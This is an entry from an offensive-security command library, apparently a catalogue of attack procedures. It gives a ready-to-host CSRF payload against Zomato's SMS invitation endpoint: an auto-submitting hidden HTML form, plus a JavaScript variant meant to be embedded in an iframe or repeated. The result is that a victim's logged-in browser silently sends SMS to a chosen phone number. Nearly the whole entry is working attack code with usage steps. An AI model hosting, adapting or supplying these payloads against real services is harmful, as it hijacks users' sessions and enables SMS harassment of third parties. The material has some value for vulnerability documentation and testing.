---
id: cmd-uuid-abcde
name: zomato-csrf-sms-form
type: command
executor: html
data: >-
  <html><body><form action="https://www.zomato.com/php/restaurantSmsHandler"
  method="POST"><input type="hidden" name="type" value="zomato-app-details"
  /><input type="hidden" name="mobile_no" value="xxxxxxxxxxxxxx" /><input
  type="submit" value="Submit request"
  id="submit"></form><script>document.getElementById('submit').click();</script></body></html>
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:23.363Z'
platforms:
  - Web
tags:
  - csrf
  - web
verified: false
validated: true
submitted: true
---

# zomato-csrf-sms-form

## Command

```html
<html><body><form action="https://www.zomato.com/php/restaurantSmsHandler" method="POST"><input type="hidden" name="type" value="zomato-app-details" /><input type="hidden" name="mobile_no" value="xxxxxxxxxxxxxx" /><input type="submit" value="Submit request" id="submit"></form><script>document.getElementById('submit').click();</script></body></html>
```

## Description

This HTML payload creates a malicious form that auto-submits a CSRF request to Zomato's SMS invitation endpoint, sending an unwanted invitation to a specified phone number when loaded by an authenticated user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| action | Target endpoint URL | Yes |
| type | SMS type parameter | Yes |
| mobile_no | Target phone number (redacted in example) | Yes |
| submit | Triggers form submission via JavaScript | Yes |

## Examples

### Basic Usage

Save the HTML to a file and host it:

```html
<html><body><form action="https://www.zomato.com/php/restaurantSmsHandler" method="POST"><input type="hidden" name="type" value="zomato-app-details" /><input type="hidden" name="mobile_no" value="1234567890" /><input type="submit" value="Submit request" id="submit"></form><script>document.getElementById('submit').click();</script></body></html>
```

### Advanced Usage

Embed in an iframe or modify for multiple submissions:

```html
<html><body><script>var form = document.createElement('form'); form.method = 'POST'; form.action = 'https://www.zomato.com/php/restaurantSmsHandler'; var typeInput = document.createElement('input'); typeInput.name = 'type'; typeInput.value = 'zomato-app-details'; form.appendChild(typeInput); var mobileInput = document.createElement('input'); mobileInput.name = 'mobile_no'; mobileInput.value = '1234567890'; form.appendChild(mobileInput); document.body.appendChild(form); form.submit();</script></body></html>
```

## Expected Output

When loaded in a browser authenticated to Zomato, the form submits silently, resulting in an SMS invitation sent to the specified mobile_no. No visible output in the page; success confirmed by SMS receipt or server-side logs.

## Related

- [[procedures/Exploit-CSRF-in-Zomato-SMS-Invitation]]
